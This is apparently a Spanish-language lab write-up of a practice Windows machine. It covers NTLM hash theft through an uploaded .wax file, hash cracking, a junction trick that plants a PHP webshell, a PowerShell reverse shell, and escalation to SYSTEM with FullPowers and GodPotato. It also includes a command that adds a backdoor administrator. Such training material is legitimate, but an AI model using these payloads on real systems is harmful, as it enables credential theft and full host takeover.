---
title: "Media (Medium)"
date: 2026-11-07
author: "Isma"
slug: "media"
tags: ["Windows", "NTLM Theft", "File Upload", "Hash Cracking", "Path Predictable", "Junction", "RCE", "SeImpersonatePrivilege", "Potato"]
categories: ["Machine", "CPTS Preparation"]
draft: false
source: "obsidian"
---

## Resumen

Media es una máquina Windows que aloja la web de un estudio de diseño con un formulario de solicitud de empleo que acepta subir vídeos en formatos de Windows Media (`.wax`, `.asx`…). Esos formatos son en realidad XML con referencias a rutas externas, así que subo uno que apunta a un recurso UNC propio: cuando el sistema lo "reproduce" en el servidor, me filtra el hash NetNTLMv2 de un usuario, que crackeo offline y uso para entrar por SSH. Dentro encuentro el script PowerShell que procesa las subidas y el código PHP del formulario: la carpeta de destino de cada subida se calcula como el **MD5 de los datos del formulario**, así que puedo predecirla y reservarla de antemano. Borro esa carpeta y la sustituyo por una **junction** (`mklink /J`) hacia la raíz web, de modo que la siguiente subida con los mismos datos deja un webshell PHP directamente accesible. Ya con RCE como la cuenta del servicio web, restauro el `SeImpersonatePrivilege` perdido con **FullPowers** y lo exploto con **GodPotato** para llegar a `SYSTEM`.

## Reconocimiento

```
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: ProMotion Studio
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: MEDIA
|   NetBIOS_Computer_Name: MEDIA
Service Info: OS: Windows
```

Una máquina Windows standalone (no hay dominio) con **Apache + PHP** sobre XAMPP (el banner delata `(Win64) OpenSSL/1.1.1t PHP/8.1.17`) y SSH habilitado, raro en Windows pero cada vez más común con OpenSSH for Windows.

### Web: ProMotion Studio

```bash
whatweb http://10.129.234.67/
```

```
Apache[2.4.56], Bootstrap, HTML5, PHP[8.1.17], Title[ProMotion Studio]
```

La web es la página de un estudio de diseño gráfico. En la sección *Hiring* hay un formulario de solicitud de empleo con **subida de vídeo**: pide nombre, apellido, email y un archivo "compatible con Windows Media Player". Los formatos aceptados son los de **Windows Media**: `.asf`, `.wma`, `.wmv`, `.wm`... y, como veremos, también `.wax`.

![media](/images/obsidian/media/pasted-image-20260817164522.png)

## Acceso Inicial (Foothold)

### Robo de hash NTLM con un fichero .wax

Un `.wax` no es un vídeo binario: es un **XML** (Windows Media ASX playlist) que apunta a otro recurso, incluida una ruta UNC. Si el visor del servidor "reproduce" ese `.wax` y la referencia es `\\mi-ip\...`, Windows intenta resolver esa ruta por SMB y se autentica contra mi máquina. Genero uno con la herramienta **ntlm_theft**:

```bash
git clone https://github.com/Greenwolf/ntlm_theft
python3 ntlm_theft.py -g wax -s 10.10.15.252 -f Video-1
```

```
Created: Video-1/Video-1.wax (OPEN)
```

El contenido generado es justo ese XML con la referencia UNC:

```xml
<asx version="3.0">
    <title>Leak</title>
    <entry>
        <title></title>
        <ref href="file://10.10.15.252\test\0xdf.mp3"/>
    </entry>
</asx>
```

![media](/images/obsidian/media/pasted-image-20260817171526.png)

Subo `Video-1.wax` por el formulario de *Hiring*. Con un listener SMB (`responder` o `impacket-smbserver`) capturo el hash NetNTLMv2 cuando el servidor procesa el fichero:

![media](/images/obsidian/media/pasted-image-20260817172249.png)

### Crackeo del hash

```bash
hashcat -m 5600 enox.hash /usr/share/wordlists/seclists/rockyou.txt
```

```
ENOX::MEDIA:99633e356a6c9c0b:...:1234virus@
```

![media](/images/obsidian/media/pasted-image-20260817172412.png)

```
enox : 1234virus@
```

### Acceso por SSH

```bash
ssh enox@10.129.234.67
```

![media](/images/obsidian/media/pasted-image-20260817174245.png)

Ya dentro, enumero el sistema y leo la **User Flag**.

![media](/images/obsidian/media/pasted-image-20260817174349.png)

## Movimiento Lateral

### El script que procesa las subidas

En `C:\Users\enox\Documents\review.ps1` hay un watcher que se ejecuta en bucle: lee `C:\Windows\Tasks\Uploads\todo.txt`, saca el nombre de fichero y una "variable aleatoria" (una carpeta), y abre ese vídeo con **Windows Media Player**:

```powershell
$todofile = "C:\Windows\Tasks\Uploads\todo.txt"
$mediaPlayerPath = "C:\Program Files (x86)\Windows Media Player\wmplayer.exe"
...
Start-Process -FilePath $mediaPlayerPath -ArgumentList "C:\Windows\Tasks\uploads\$randomVariable\$filename"
```

Esto confirma por qué el `.wax` funcionó: cada vídeo subido se abre automáticamente con Windows Media Player en el servidor.

El propio `enox` tiene permisos de escritura sobre `C:\Windows\Tasks\Uploads`, que compruebo con `icacls`.

### Carpeta de subida predecible

En `C:\xampp\htdocs\index.php` está el código que procesa el formulario:

```php
$uploadDir = 'C:/Windows/Tasks/Uploads/';

$folderName = md5($firstname . $lastname . $email);
$targetDir = $uploadDir . $folderName . '/';

if (!file_exists($targetDir)) {
    mkdir($targetDir, 0777, true);
}

$sanitizedFilename = preg_replace("/[^a-zA-Z0-9._]/", "", $originalFilename);
$targetFile = $targetDir . $sanitizedFilename;
move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile);
```

La carpeta donde se guarda cada subida **no es aleatoria**: es el **MD5 de `firstname + lastname + email`**. Si controlo esos tres campos, controlo de antemano el nombre exacto de la carpeta donde aterrizará el archivo.

Pruebo subiendo un fichero con `firstname=lala`, `lastname=lala`, `email=lala@lala.com`:

![media](/images/obsidian/media/pasted-image-20260817191846.png)

```
md5("lalalala@lala.com") = e66d46f681fe1b6f0dcf47dfbae8bcd6
```

Y compruebo que, efectivamente, el fichero llega a esa carpeta predecible dentro de `C:\Windows\Tasks\Uploads`:

![media](/images/obsidian/media/pasted-image-20260817191934.png)

### De carpeta predecible a webshell con una junction

El filtro de nombre de fichero (`preg_replace("/[^a-zA-Z0-9._]/", "", ...)`) no bloquea la extensión `.php`, solo caracteres raros. El problema es que el fichero se guarda bajo `Uploads/`, que no es servido por Apache. Pero como `enox` tiene permisos de escritura ahí, puedo **sustituir la carpeta de destino por un enlace** (*junction*) hacia la raíz web:

```powershell
# 1. Elimino de antemano la carpeta que el MD5 va a generar
rm .\e66d46f681fe1b6f0dcf47dfbae8bcd6\phprev.php
rm .\e66d46f681fe1b6f0dcf47dfbae8bcd6\

# 2. La sustituyo por una junction hacia la raíz de la web
cmd /c mklink /J C:\Windows\Tasks\Uploads\e66d46f681fe1b6f0dcf47dfbae8bcd6 C:\xampp\htdocs
```

```
Junction created for C:\Windows\Tasks\Uploads\e66d46f681fe1b6f0dcf47dfbae8bcd6 <<===>> C:\xampp\htdocs
```

Subo un `phprev.php` (una webshell simple basada en `cmd`) por el formulario con los mismos tres campos (`lala`/`lala`/`lala@lala.com`), de forma que `move_uploaded_file()` escribe el fichero **a través de la junction**, directamente dentro de `C:\xampp\htdocs`:

![media](/images/obsidian/media/pasted-image-20260817192602.png)

```
Directory of C:\Windows\Tasks\Uploads\e66d46f681fe1b6f0dcf47dfbae8bcd6
08/17/2026  10:18 AM        35 phprev.php
```

El fichero ahora es accesible directamente desde la web:

![media](/images/obsidian/media/pasted-image-20260817192829.png)

### RCE como cuenta de servicio

Pido el webshell con un comando PowerShell en base64 (reverse shell codificada):

```
curl "http://10.129.234.67/phprev.php?cmd=powershell%20-e%20<base64>"
```

Recibo shell como **`nt authority\local service`**:

![media](/images/obsidian/media/pasted-image-20260817193150.png)

## Escalada de Privilegios

### SeImpersonatePrivilege deshabilitado

`LOCAL SERVICE` debería tener `SeImpersonatePrivilege` por defecto, pero no aparece en `whoami /priv`:

```
SeChangeNotifyPrivilege       Enabled
SeCreateGlobalPrivilege       Enabled
```

Apache, al arrancar como servicio bajo ese contexto restringido, pierde varios privilegios por defecto del token, incluido el de impersonación, necesario para los ataques tipo *Potato*.

### FullPowers: recuperar los privilegios por defecto

**FullPowers** restaura en el proceso actual los privilegios que la cuenta debería tener por defecto, lanzando un nuevo proceso con un token "completo":

```bash
scp FullPowers.exe enox@10.129.234.67:/programdata/
```

```powershell
.\FullPowers.exe -c "powershell -e <base64-reverse-shell>"
```

La nueva shell sí tiene **`SeImpersonatePrivilege`** habilitado:

![media](/images/obsidian/media/pasted-image-20260817194046.png)

- https://github.com/itm4n/FullPowers

### GodPotato

Con `SeImpersonatePrivilege` activo, **GodPotato** abusa de la autenticación de DCOM/RPC a `NT AUTHORITY\SYSTEM` para robar un token de `SYSTEM` y ejecutar cualquier comando con él:

```bash
scp GodPotato.exe enox@10.129.234.67:/programdata/
```

```powershell
.\GodPotato.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
```

Leo directamente la **Root Flag** como `SYSTEM`. También podría obtener una shell interactiva o persistir con un nuevo usuario administrador:

```powershell
.\GodPotato.exe -cmd "cmd /c net user pentester P@ssw0rd123! /add && net localgroup administrators pentester /add"
```

- https://github.com/BeichenDream/GodPotato

## Conclusiones

- Cualquier formato de fichero que internamente sea XML con referencias externas (`.wax`, `.asx`, `.lnk`, `.url`, `.library-ms`…) es un vector de robo de hash NTLM si el servidor lo abre automáticamente.
- Generar el nombre de una carpeta o fichero destino a partir de datos **que el propio usuario controla** (como un MD5 de campos de formulario) no aporta ninguna aleatoriedad real: es tan predecible como si no hubiera hash.
- Una `mklink /J` (junction) creada con permisos de escritura sobre un directorio puede saltarse por completo la separación entre "carpeta de subidas" y "raíz web".
- Los servicios que corren como `LOCAL SERVICE`/`NETWORK SERVICE` a menudo pierden privilegios por defecto del token; herramientas como FullPowers los recuperan, y de ahí a `SYSTEM` con un Potato solo hay un paso si `SeImpersonatePrivilege` está disponible.
